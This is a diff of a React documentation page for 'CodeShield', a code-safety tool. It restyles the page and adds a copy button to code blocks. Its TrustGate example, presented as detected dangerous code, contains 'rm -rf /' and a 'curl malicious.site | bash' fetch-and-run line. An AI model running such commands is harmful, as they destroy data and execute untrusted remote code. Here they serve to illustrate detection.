@@ -27,25 +27,50 @@ const ServerIcon = () => (
 const ApiIcon = () => (
     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
 );
-const GitHubIcon = () => (
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
-);
 const ArrowLeftIcon = () => (
     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
 );
-
-const CodeBlock: React.FC<{ code: string; title?: string }> = ({ code, title }) => (
-    <div className="bg-slate-900/50 border border-brand-500/10 rounded-lg overflow-hidden my-6 shadow-lg shadow-black/20">
-        {title && (
-            <div className="px-4 py-2 border-b border-white/5 text-xs text-brand-300 font-mono bg-white/5">
-                {title}
-            </div>
-        )}
-        <pre className="p-4 text-sm text-slate-300 font-mono overflow-x-auto leading-relaxed custom-scrollbar bg-black/20">
-            <code>{code}</code>
-        </pre>
-    </div>
+const CopyIcon = () => (
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
 );
+const CheckIcon = () => (
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+);
+
+const CodeBlock: React.FC<{ code: string; title?: string }> = ({ code, title }) => {
+    const [copied, setCopied] = useState(false);
+
+    const handleCopy = () => {
+        navigator.clipboard.writeText(code);
+        setCopied(true);
+        setTimeout(() => setCopied(false), 2000);
+    };
+
+    return (
+        <div className="rounded-xl overflow-hidden bg-[#0d1117] border border-white/10 shadow-2xl my-6">
+            <div className="flex items-center justify-between px-4 py-3 bg-[#161b22] border-b border-white/5">
+                <div className="flex items-center gap-4">
+                    <div className="flex gap-2">
+                        <div className="w-3 h-3 rounded-full bg-[#FF5F56] border border-[#E0443E]/50" />
+                        <div className="w-3 h-3 rounded-full bg-[#FFBD2E] border border-[#DEA123]/50" />
+                        <div className="w-3 h-3 rounded-full bg-[#27C93F] border border-[#1AAB29]/50" />
+                    </div>
+                    {title && <span className="text-xs text-slate-400 font-mono opacity-75">{title}</span>}
+                </div>
+                <button 
+                    onClick={handleCopy}
+                    className="flex items-center gap-1.5 px-2 py-1 rounded hover:bg-white/5 text-xs text-slate-400 hover:text-white transition-colors"
+                >
+                    {copied ? <CheckIcon /> : <CopyIcon />}
+                    {copied ? 'Copied' : 'Copy'}
+                </button>
+            </div>
+            <pre className="p-4 text-sm text-slate-300 font-mono overflow-x-auto leading-relaxed custom-scrollbar selection:bg-brand-500/30">
+                <code>{code}</code>
+            </pre>
+        </div>
+    );
+};
 
 const NavItem: React.FC<{ 
     active: boolean; 
@@ -79,29 +104,32 @@ export const Docs: React.FC<DocsProps> = ({ onBack }) => {
         >
             <div className="min-h-screen flex flex-col">
                 {/* Header */}
-                <header className="border-b border-white/5 px-6 py-4 bg-slate-900/50 backdrop-blur-md sticky top-0 z-20">
-                    <div className="max-w-7xl mx-auto flex items-center justify-between">
-                        <div className="flex items-center gap-6">
-                            <Logo size="sm" />
-                            <span className="text-slate-600 font-light">|</span>
-                            <span className="text-sm text-slate-400 font-medium tracking-wide uppercas">Documentation</span>
+                <header className="border-b border-white/5 bg-slate-900/50 backdrop-blur-md sticky top-0 z-20">
+                    <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
+                        {/* Left Side: Logo & Labels */}
+                        <div className="flex items-center gap-4 md:gap-6">
+                            {/* Logo has its own text, so we just show it */}
+                            <Logo size="sm" showText={true} />
+                            
+                            {/* Divider & Section Name */}
+                            <div className="hidden md:flex items-center gap-4">
+                                <span className="text-white/10 text-xl font-light">/</span>
+                                <span className="text-sm text-slate-400 font-medium tracking-wide">DOCUMENTATION</span>
+                            </div>
                         </div>
+
+                        {/* Right Side: Navigation Actions */}
                         <div className="flex items-center gap-4">
-                            <a 
-                                href="https://github.com/Erebuzzz/CodeShield"
-                                target="_blank"
-                                rel="noopener noreferrer"
-                                className="text-sm text-slate-400 hover:text-white transition-colors flex items-center gap-1.5"
-                            >
-                                <GitHubIcon />
+                            <a href="https://github.com/Erebuzzz/CodeShield" target="_blank" rel="noopener" className="text-sm text-slate-400 hover:text-white transition-colors font-medium">
                                 GitHub
                             </a>
+                            
                             {onBack && (
                                 <button
                                     onClick={onBack}
-                                    className="px-4 py-1.5 rounded-full border border-white/10 text-sm text-slate-400 hover:text-white hover:bg-white/5 transition-all flex items-center gap-1.5"
+                                    className="group px-4 py-1.5 rounded-full border border-white/10 bg-white/[0.02] hover:bg-white/[0.08] text-sm text-slate-400 hover:text-white transition-all flex items-center gap-2"
                                 >
-                                    <ArrowLeftIcon />
+                                    <span className="group-hover:-translate-x-0.5 transition-transform"><ArrowLeftIcon /></span>
                                     Back to App
                                 </button>
                             )}
@@ -112,8 +140,8 @@ export const Docs: React.FC<DocsProps> = ({ onBack }) => {
                 <div className="max-w-7xl mx-auto flex flex-1 w-full relative">
                     {/* Sidebar Navigation */}
                     <aside className="w-64 shrink-0 border-r border-white/5 p-6 sticky top-[73px] h-[calc(100vh-73px)] hidden md:block overflow-y-auto custom-scrollbar">
-                        <div className="mb-6 px-3 text-xs font-bold text-slate-500 uppercase tracking-widest">Guide</div>
-                        <nav className="space-y-1">
+                        <div className="mb-6 px-3 text-[10px] font-bold text-slate-600 uppercase tracking-widest">Guide</div>
+                        <nav className="space-y-1 mb-8">
                             <NavItem 
                                 active={activeSection === 'overview'} 
                                 onClick={() => setActiveSection('overview')}
@@ -140,7 +168,7 @@ export const Docs: React.FC<DocsProps> = ({ onBack }) => {
                             />
                         </nav>
                         
-                        <div className="mt-8 mb-6 px-3 text-xs font-bold text-slate-500 uppercase tracking-widest">Developers</div>
+                        <div className="mb-6 px-3 text-[10px] font-bold text-slate-600 uppercase tracking-widest">Developers</div>
                         <nav className="space-y-1">
                             <NavItem 
                                 active={activeSection === 'mcp'} 
@@ -161,27 +189,27 @@ export const Docs: React.FC<DocsProps> = ({ onBack }) => {
                     <main className="flex-1 p-8 md:p-12 max-w-4xl">
                         <motion.div
                             key={activeSection}
-                            initial={{ opacity: 0, y: 20 }}
+                            initial={{ opacity: 0, y: 10 }}
                             animate={{ opacity: 1, y: 0 }}
                             transition={{ duration: 0.3 }}
                         >
                             {activeSection === 'overview' && (
-                                <div className="space-y-8">
+                                <div className="space-y-12">
                                     <div>
-                                        <h1 className="text-4xl font-display font-light text-white mb-4">Introduction to CodeShield</h1>
-                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
+                                        <h1 className="text-4xl md:text-5xl font-display font-medium text-white mb-6">Introduction</h1>
+                                        <p className="text-lg text-slate-400 leading-relaxed font-light max-w-2xl">
                                             CodeShield is a secure, intelligent coding assistant designed to protect your codebase from malicious patterns and poor practices. It acts as a firewall for your code generation workflow.
                                         </p>
                                     </div>
 
                                     <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                                         {[
-                                            { title: 'TrustGate', desc: 'Secure Sandbox Execution', icon: <ShieldIcon /> },
-                                            { title: 'StyleForge', desc: 'Auto-formatting & Linting', icon: <WandIcon /> },
-                                            { title: 'ContextVault', desc: 'Privacy-first Memory', icon: <DatabaseIcon /> },
+                                            { title: 'TrustGate', desc: 'Secure Sandbox', icon: <ShieldIcon /> },
+                                            { title: 'StyleForge', desc: 'Auto-formatting', icon: <WandIcon /> },
+                                            { title: 'ContextVault', desc: 'State Memory', icon: <DatabaseIcon /> },
                                         ].map((feature, i) => (
-                                            <div key={i} className="p-6 rounded-xl bg-white/[0.02] border border-white/5 hover:border-brand-500/30 transition-colors">
-                                                <div className="mb-4 text-brand-400">{feature.icon}</div>
+                                            <div key={i} className="p-6 rounded-2xl bg-white/[0.02] border border-white/5 hover:border-brand-500/30 transition-colors group">
+                                                <div className="mb-4 text-brand-400 group-hover:scale-110 transition-transform origin-left">{feature.icon}</div>
                                                 <h3 className="text-lg font-medium text-white mb-2">{feature.title}</h3>
                                                 <p className="text-sm text-slate-400">{feature.desc}</p>
                                             </div>
@@ -191,47 +219,154 @@ export const Docs: React.FC<DocsProps> = ({ onBack }) => {
                             )}
                             
                             {activeSection === 'trustgate' && (
-                                <div className="space-y-8">
+                                <div className="space-y-10">
                                     <div>
-                                        <h1 className="text-4xl font-display font-light text-white mb-4">TrustGate</h1>
-                                        <p className="text-lg text-slate-400 leading-relaxed">
+                                        <h1 className="text-4xl font-display font-medium text-white mb-4">TrustGate</h1>
+                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
                                             TrustGate validates generated code in a secure, isolated sandbox environment. It detects potential security vulnerabilities, infinite loops, and malicious imports before they touch your production environment.
                                         </p>
                                     </div>
 
-                                    <div className="space-y-4">
-                                        <h2 className="text-2xl font-display font-light text-white">How it works</h2>
-                                        <ul className="space-y-3 text-slate-400 list-disc pl-5">
-                                            <li>Parses Abstract Syntax Tree (AST) to detect dangerous imports (e.g., `os`, `subprocess`).</li>
-                                            <li>Analyzes resource usage to prevent denial of service vectors.</li>
-                                            <li>Executes code in a restricted container with network isolation.</li>
+                                    <div className="space-y-6">
+                                        <h2 className="text-2xl font-display font-medium text-white">Security Detection Strategy</h2>
+                                        <ul className="grid grid-cols-1 gap-4">
+                                            {[
+                                                "Static Analysis of AST to find dangerous imports (os, subprocess)",
+                                                "Resource usage limits to prevent Denial of Service",
+                                                "Network isolation in sandboxed execution containers"
+                                            ].map((item, i) => (
+                                                <li key={i} className="flex items-start gap-3 text-slate-400 bg-white/[0.01] p-3 rounded-lg border border-white/5">
+                                                    <span className="text-brand-400 mt-1"><CheckIcon /></span>
+                                                    {item}
+                                                </li>
+                                            ))}
                                         </ul>
                                     </div>
                                     
-                                    <CodeBlock 
-                                        title="Example Detection"
-                                        code={`# Dangerous code detected by TrustGate
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Example Detection</h2>
+                                        <CodeBlock 
+                                            title="malicious_script.py"
+                                            code={`# Dangerous code detected by TrustGate
 import os
 import subprocess
 
-# This will trigger an error
-def delete_files():
-    subprocess.run("rm -rf /", shell=True)`}
-                                    />
+def dangerous_operation():
+    # TrustGate blocks this instantly
+    subprocess.run("rm -rf /", shell=True)
+    
+    # And this too
+    os.system("curl malicious.site | bash")`}
+                                        />
+                                    </div>
+                                </div>
+                            )}
+
+                            {activeSection === 'styleforge' && (
+                                <div className="space-y-10">
+                                    <div>
+                                        <h1 className="text-4xl font-display font-medium text-white mb-4">StyleForge</h1>
+                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
+                                            StyleForge ensures your generated code feels like home. It analyzes your existing codebase to detect naming conventions and coding patterns, then automatically adapts new code to match.
+                                        </p>
+                                    </div>
+
+                                    <div className="space-y-6">
+                                        <h2 className="text-2xl font-display font-medium text-white">Features</h2>
+                                        <div className="grid grid-cols-1 gap-4">
+                                            {[
+                                                { title: "Universal Pattern Detection", desc: "Identifies snake_case, camelCase, PascalCase automatically." },
+                                                { title: "Intelligent Auto-Correction", desc: "Rewrites variable/function names to match project style." },
+                                                { title: "Conflict Prevention", desc: "Ensures new identifiers don't clash with existing ones." }
+                                            ].map((item, i) => (
+                                                <div key={i} className="p-4 rounded-xl bg-white/[0.02] border border-white/5">
+                                                    <strong className="text-brand-400 block mb-1">{item.title}</strong>
+                                                    <span className="text-slate-400 text-sm">{item.desc}</span>
+                                                </div>
+                                            ))}
+                                        </div>
+                                    </div>
+
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Before vs After</h2>
+                                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                                            <CodeBlock
+                                                title="Raw LLM Output (Mixed Style)"
+                                                code={`def CalculateTotal(Users_List):
+    TotalValue = 0
+    for U in Users_List:
+        TotalValue += U.price
+    return TotalValue`}
+                                            />
+                                            <CodeBlock
+                                                title="StyleForge (Verified snake_case)"
+                                                code={`def calculate_total(users_list):
+    total_value = 0
+    for user in users_list:
+        total_value += user.price
+    return total_value`}
+                                            />
+                                        </div>
+                                    </div>
+                                </div>
+                            )}
+
+                            {activeSection === 'contextvault' && (
+                                <div className="space-y-10">
+                                    <div>
+                                        <h1 className="text-4xl font-display font-medium text-white mb-4">ContextVault</h1>
+                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
+                                            ContextVault acts like a "Save Game" for your development workflow. It captures your entire mental state—open files, cursor positions, and notes—so you can switch tasks without losing focus.
+                                        </p>
+                                    </div>
+
+                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                        <div className="p-6 rounded-2xl bg-gradient-to-br from-indigo-500/10 to-purple-500/5 border border-indigo-500/10">
+                                            <div className="text-indigo-400 mb-3"><DatabaseIcon /></div>
+                                            <h3 className="text-white font-medium mb-2">State Persistence</h3>
+                                            <p className="text-sm text-slate-400 leading-relaxed">Saves open files, active tabs, and exact cursor locations to a local SQLite database.</p>
+                                        </div>
+                                        <div className="p-6 rounded-2xl bg-gradient-to-br from-emerald-500/10 to-teal-500/5 border border-emerald-500/10">
+                                            <div className="text-emerald-400 mb-3"><WandIcon /></div>
+                                            <h3 className="text-white font-medium mb-2">Instant Restore</h3>
+                                            <p className="text-sm text-slate-400 leading-relaxed">One-click restoration brings your IDE back to the exact moment you left off.</p>
+                                        </div>
+                                    </div>
+
+                                    <div>
+                                        <h2 className="text-2xl font-display font-medium text-white mb-4">Data Structure</h2>
+                                        <CodeBlock 
+                                            title="context.json"
+                                            code={`{
+  "name": "refactoring-auth-module",
+  "created_at": "2023-10-27T10:30:00Z",
+  "files": [
+    "src/auth/login.py",
+    "src/auth/user.py"
+  ],
+  "cursor": {
+    "file": "src/auth/login.py",
+    "line": 42,
+    "column": 15
+  },
+  "notes": "Remember to fix the token expiration logic."
+}`}
+                                        />
+                                    </div>
                                 </div>
                             )}
 
                             {activeSection === 'mcp' && (
-                                <div className="space-y-8">
+                                <div className="space-y-10">
                                     <div>
-                                        <h1 className="text-4xl font-display font-light text-white mb-4">MCP Server Integration</h1>
-                                        <p className="text-lg text-slate-400 leading-relaxed">
+                                        <h1 className="text-4xl font-display font-medium text-white mb-4">MCP Server Integration</h1>
+                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
                                             CodeShield exposes functionality via the Model Context Protocol (MCP), allowing AI models to leverage secure execution and validation capabilities directly.
                                         </p>
                                     </div>
 
                                     <CodeBlock 
-                                        title="MCP Tool Definition"
+                                        title="mcp_config.json"
                                         code={`{
   "name": "verify_code",
   "description": "Verify code security and correctness",
@@ -246,142 +381,49 @@ def delete_files():
                                     />
                                 </div>
                             )}
-                            
-                            {(activeSection === 'styleforge') && (
-                                <div className="space-y-8">
+
+                            {activeSection === 'api' && (
+                                <div className="space-y-10">
                                     <div>
-                                        <h1 className="text-4xl font-display font-light text-white mb-4">StyleForge</h1>
-                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
-                                            StyleForge ensures your generated code feels like home. It analyzes your existing codebase to detect naming conventions and coding patterns, then automatically adapts new code to match.
-                                        </p>
-                                    </div>
-
-                                    <div className="space-y-4">
-                                        <h2 className="text-2xl font-display font-light text-white">Features</h2>
-                                        <ul className="space-y-3 text-slate-400 list-disc pl-5">
-                                            <li><strong className="text-brand-400">Universal Pattern Detection:</strong> Automatically identifies if your project uses snake_case, camelCase, PascalCase, or SCREAMING_SNAKE.</li>
-                                            <li><strong className="text-brand-400">Intelligent Auto-Correction:</strong> Rewrites variable and function names in generated code to match your project's style.</li>
-                                            <li><strong className="text-brand-400">Conflict Prevention:</strong> Ensures new identifiers don't clash with existing ones.</li>
-                                        </ul>
-                                    </div>
-
-                                    <div className="bg-slate-900/50 border border-brand-500/10 rounded-lg p-6">
-                                        <h3 className="text-sm font-bold text-slate-500 uppercase tracking-widest mb-4">Before vs After</h3>
-                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                            <div className="p-4 bg-red-500/5 border border-red-500/10 rounded-lg">
-                                                <div className="text-xs text-red-400 font-mono mb-2">Raw LLM Output</div>
-                                                <pre className="text-sm text-slate-400 font-mono"><code>def CalculateTotal(Users_List):
-    TotalValue = 0
-    for U in Users_List:
-        TotalValue += U.price
-    return TotalValue</code></pre>
-                                            </div>
-                                            <div className="p-4 bg-emerald-500/5 border border-emerald-500/10 rounded-lg">
-                                                <div className="text-xs text-emerald-400 font-mono mb-2">StyleForge Adjusted (snake_case)</div>
-                                                <pre className="text-sm text-slate-300 font-mono"><code>def calculate_total(users_list):
-    total_value = 0
-    for user in users_list:
-        total_value += user.price
-    return total_value</code></pre>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            )}
-
-                            {(activeSection === 'contextvault') && (
-                                <div className="space-y-8">
-                                    <div>
-                                        <h1 className="text-4xl font-display font-light text-white mb-4">ContextVault</h1>
-                                        <p className="text-lg text-slate-400 leading-relaxed font-light">
-                                            ContextVault acts like a "Save Game" for your development workflow. It captures your entire mental state—open files, cursor positions, and notes—so you can switch tasks without losing focus.
-                                        </p>
-                                    </div>
-
-                                    <div className="space-y-4">
-                                        <h2 className="text-2xl font-display font-light text-white">Capabilities</h2>
-                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                            <div className="p-4 rounded-xl bg-white/[0.02] border border-white/5">
-                                                <div className="text-brand-400 mb-2"><DatabaseIcon /></div>
-                                                <h3 className="text-white font-medium mb-1">State Persistence</h3>
-                                                <p className="text-sm text-slate-400">Saves open files, active tabs, and exact cursor locations to a local SQLite database.</p>
-                                            </div>
-                                            <div className="p-4 rounded-xl bg-white/[0.02] border border-white/5">
-                                                <div className="text-brand-400 mb-2"><WandIcon /></div>
-                                                <h3 className="text-white font-medium mb-1">Instant Restore</h3>
-                                                <p className="text-sm text-slate-400">One-click restoration brings your IDE back to the exact moment you left off.</p>
-                                            </div>
-                                        </div>
-                                    </div>
-
-                                    <CodeBlock 
-                                        title="Context Structure (JSON)"
-                                        code={`{
-  "name": "refactoring-auth-module",
-  "created_at": "2023-10-27T10:30:00Z",
-  "files": [
-    "src/auth/login.py",
-    "src/auth/user.py"
-  ],
-  "cursor": {
-    "file": "src/auth/login.py",
-    "line": 42,
-    "column": 15
-  },
-  "notes": "Remember to fix the token expiration logic."
-}`}
-                                    />
-                                </div>
-                            )}
-
-                            {(activeSection === 'api') && (
-                                <div className="space-y-8">
-                                    <div>
-                                        <h1 className="text-4xl font-display font-light text-white mb-4">API Reference</h1>
+                                        <h1 className="text-4xl font-display font-medium text-white mb-4">API Reference</h1>
                                         <p className="text-lg text-slate-400 leading-relaxed font-light">
                                             The CodeShield API allows you to integrate security scanning and style enforcement directly into your CI/CD pipelines or custom tools.
                                         </p>
                                     </div>
 
-                                    <div className="space-y-6">
-                                        <div className="border border-white/5 rounded-xl overflow-hidden">
-                                            <div className="bg-white/5 px-4 py-3 flex items-center gap-3 border-b border-white/5">
-                                                <span className="px-2 py-0.5 rounded text-xs font-bold bg-emerald-500/20 text-emerald-400">POST</span>
-                                                <code className="text-sm text-slate-300">/api/verify</code>
+                                    <div className="space-y-8">
+                                        <div className="border border-white/5 rounded-2xl overflow-hidden bg-white/[0.01]">
+                                            <div className="bg-white/[0.03] px-5 py-4 flex items-center gap-3 border-b border-white/5">
+                                                <span className="px-2.5 py-1 rounded-md text-xs font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/10">POST</span>
+                                                <code className="text-sm text-slate-300 font-mono">/api/verify</code>
                                             </div>
-                                            <div className="p-4">
-                                                <p className="text-sm text-slate-400 mb-4">Analyzes code for security vulnerabilities and dangerous patterns.</p>
-                                                <h4 className="text-xs font-bold text-slate-500 uppercase mb-2">Request Body</h4>
-                                                <pre className="bg-black/30 p-3 rounded text-xs font-mono text-slate-300"><code>{`{
+                                            <div className="p-6">
+                                                <p className="text-sm text-slate-400 mb-6">Analyzes code for security vulnerabilities and dangerous patterns.</p>
+                                                <CodeBlock
+                                                    title="Request Body"
+                                                    code={`{
   "code": "print('hello')",
   "auto_fix": true,
   "use_sandbox": false
-}`}</code></pre>
+}`}
+                                                />
                                             </div>
                                         </div>
 
-                                        <div className="border border-white/5 rounded-xl overflow-hidden">
-                                            <div className="bg-white/5 px-4 py-3 flex items-center gap-3 border-b border-white/5">
-                                                <span className="px-2 py-0.5 rounded text-xs font-bold bg-emerald-500/20 text-emerald-400">POST</span>
-                                                <code className="text-sm text-slate-300">/api/style</code>
+                                        <div className="border border-white/5 rounded-2xl overflow-hidden bg-white/[0.01]">
+                                            <div className="bg-white/[0.03] px-5 py-4 flex items-center gap-3 border-b border-white/5">
+                                                <span className="px-2.5 py-1 rounded-md text-xs font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/10">POST</span>
+                                                <code className="text-sm text-slate-300 font-mono">/api/style</code>
                                             </div>
-                                            <div className="p-4">
-                                                <p className="text-sm text-slate-400 mb-4">Checks code against the project's detected style conventions.</p>
-                                                <h4 className="text-xs font-bold text-slate-500 uppercase mb-2">Request Body</h4>
-                                                <pre className="bg-black/30 p-3 rounded text-xs font-mono text-slate-300"><code>{`{
+                                            <div className="p-6">
+                                                <p className="text-sm text-slate-400 mb-6">Checks code against the project's detected style conventions.</p>
+                                                <CodeBlock
+                                                    title="Request Body"
+                                                    code={`{
   "code": "def MyFunction(): pass",
   "codebase_path": "./src"
-}`}</code></pre>
-                                            </div>
-                                        </div>
-                                        
-                                        <div className="border border-white/5 rounded-xl overflow-hidden">
-                                            <div className="bg-white/5 px-4 py-3 flex items-center gap-3 border-b border-white/5">
-                                                <span className="px-2 py-0.5 rounded text-xs font-bold bg-blue-500/20 text-blue-400">GET</span>
-                                                <code className="text-sm text-slate-300">/api/health</code>
-                                            </div>
-                                            <div className="p-4">
-                                                <p className="text-sm text-slate-400">Checks if the API server is online and modules are loaded.</p>
+}`}
+                                                />
                                             </div>
                                         </div>
                                     </div>
